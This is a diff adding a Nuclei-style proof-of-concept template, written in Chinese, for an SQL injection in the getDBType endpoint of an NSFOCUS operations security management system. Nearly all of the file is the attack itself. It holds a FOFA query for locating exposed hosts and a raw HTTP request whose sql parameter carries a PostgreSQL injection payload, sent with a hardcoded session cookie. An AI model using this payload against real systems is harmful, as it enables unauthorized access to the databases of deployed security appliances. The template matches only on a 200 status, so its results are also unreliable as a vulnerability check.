@@ -1,0 +1,50 @@
+id: poc-hl6rn4oceun6r2vi
+info:
+  name: 绿盟运维安全管理系统getDBType存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hl6rn4oceun6r2vi'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hl6rn4oceun6r2vi
+    fofa: body="'/needUsbkey.php?username='"
+http:
+- raw:
+  - 'GET /webconf/log/getDBType?cat=espc&sid=7473a85e535405e7bd991cb82b2f134c&sql=(SELECT+(CHR(113)%7C%7CCHR(122)%7C%7CCHR(122)%7C%7CCHR(107)%7C%7CCHR(113))%7C%7C(SELECT+(CASE+WHEN+(3788%3D3788)+THEN+1+ELSE+0+END))%3A%3Atext%7C%7C(CHR(113)%7C%7CCHR(112)%7C%7CCHR(112)%7C%7CCHR(113)%7C%7CCHR(113))) HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Connection: keep-alive
+
+    sec-ch-ua-platform: "Windows"
+
+    X-Requested-With: XMLHttpRequest
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+
+    Accept: */*
+
+    sec-ch-ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
+
+    sec-ch-ua-mobile: ?0
+
+    Sec-Fetch-Site: same-origin
+
+    Sec-Fetch-Mode: cors
+
+    Sec-Fetch-Dest: empty
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: PHPSESSID=fdb9910a4479d9a6d7eeff579f4f2f69; PHPSESSID_NS_Sig=oenCV6ibz2py61Oz
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1762685726448-2576db8f-e169-4338-87af-41d9cc966821.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
